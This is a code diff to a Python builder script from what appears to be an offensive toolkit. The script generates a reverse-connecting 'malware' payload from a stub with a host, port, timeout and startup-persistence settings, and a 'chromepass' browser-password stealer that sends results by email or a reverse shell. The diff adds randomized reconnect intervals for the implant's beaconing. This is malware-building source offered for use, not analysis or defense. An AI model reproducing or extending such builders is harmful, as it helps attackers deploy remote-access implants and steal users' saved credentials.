@@ -49,9 +49,15 @@ def build_listener(args):
 def build_malware(args):
     print("[!] Still in testing")
     check_folders()
+    if args.reconnect_min or args.reconnect_max:
+        reconnect_min = args.reconnect_min
+        reconnect_max = args.reconnect_max
+    else:
+        reconnect_min = CONFIG["MALWARE"]["RECONNECT_MIN"]
+        reconnect_max = CONFIG["MALWARE"]["RECONNECT_MAX"]
     host = f"'{args.host}'"
     port = str(args.p)
-    for _ in range(5):
+    for _ in range(len(sys.argv)-1):
         sys.argv.pop()
     filename = CONFIG["MALWARE"]["Filename"]
     target = CONFIG["MALWARE"]["Stub"]
@@ -60,6 +66,7 @@ def build_malware(args):
     startup_name = CONFIG["MALWARE"]["Startup_name"]
     startup_icon = CONFIG["MALWARE"]["Startup_icon"]
     payload_name = CONFIG["MALWARE"]["Payload_name"]
+
     timeout = CONFIG["MALWARE"]["Timeout"]
 
     stub_try = CONFIG["STUB"]["TRY"]
@@ -83,6 +90,8 @@ def build_malware(args):
     mal_final = mal_child.replace("<<HOST>>", host)
     mal_final = mal_final.replace("<<PORT>>", port)
     mal_final = mal_final.replace("<<SESSION_TIMEOUT>>", timeout)
+    mal_final = mal_final.replace("<<RECONNECT_MIN>>", reconnect_min)
+    mal_final = mal_final.replace("<<RECONNECT_MAX>>", reconnect_max)
     with open(filename, "w") as f:
         f.write(mal_final)
 
@@ -122,7 +131,7 @@ def build_chromepass(args):
         print("Not implemented yet")
     if args.email and not args.reverse_shell:
         mailto = args.address
-        for _ in range(4):
+        for _ in range(len(sys.argv)-1):
             sys.argv.pop()
 
         # Create Chromepass
@@ -183,7 +192,7 @@ def build_chromepass(args):
         return len(cp_final)
 
     elif args.reverse_shell and not args.email:
-        for _ in range(6):
+        for _ in range(len(sys.argv)-1):
             sys.argv.pop()
         print("Not implemented yet but it's easier than email... \
 A copy paste will work, adding after rest is working")
@@ -237,6 +246,18 @@ def getOptions():
         type=int,
         metavar=f"Port for reverse connection.",
         required=True)
+    parser_build_malware.add_argument(
+        "--reconnect_min",
+        type=str,
+        metavar=f"Mininum ime to reconnect, chosen at random between min and max",
+        required=False
+    )
+    parser_build_malware.add_argument(
+        "--reconnect_max",
+        type=str,
+        metavar=f"Max time to reconnect, chosen at random between min and max",
+        required=False
+    )
     parser_build_malware.set_defaults(func=build_malware)
 
     # Build chromepass
@@ -299,8 +320,11 @@ def getOptions():
 
     # Check for mutually inclusive
     try:
-
-        if args.email and (args.address is None):
+        if args.reconnect_min and args.reconnect_max is None:
+            parser.error("--reconnect_min requires --reconnect_max")
+        elif args.reconnect_max and args.reconnect_min is None:
+            parser.error("--reconnect_max requires --reconnect_min")
+        elif args.email and (args.address is None):
             parser.error("--email requires --address")
         elif args.reverse_shell and (args.host is None or args.port is None):
             parser.error("--reverse_shell requires --host and --port.")
